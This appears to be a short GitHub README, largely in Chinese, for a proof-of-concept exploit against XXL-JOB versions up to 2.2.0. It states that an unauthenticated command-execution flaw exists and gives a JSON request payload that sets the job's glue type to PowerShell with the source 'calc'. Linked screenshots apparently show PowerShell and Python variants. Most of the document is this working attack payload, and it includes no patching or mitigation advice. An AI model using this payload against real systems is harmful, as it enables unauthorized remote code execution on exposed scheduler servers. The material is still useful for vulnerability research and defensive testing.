# xxl-job-rce

XXL-JOB是一个分布式任务调度平台，其核心设计目标是开发迅速、学习简单、轻量级、易扩展。
在xxl-job<= 2.2.0版本存在未授权命令执行

## payload:
```
{
  "jobId": 1,
  "executorHandler": "demoJobHandler",
  "executorParams": "demoJobHandler",
  "executorBlockStrategy": "COVER_EARLY",
  "executorTimeout": 0,
  "logId": 1,
  "logDateTime": 1586629003729,
  "glueType": "GLUE_POWERSHELL",
  "glueSource": "calc",
  "glueUpdatetime": 1586699003758,
  "broadcastIndex": 0,
  "broadcastTotal": 0
}
```

![image](https://github.com/mrknow001/xxl-job-rce/blob/main/xxl-job-powershell.png)
![image](https://github.com/mrknow001/xxl-job-rce/blob/main/xxl-job-python.png)
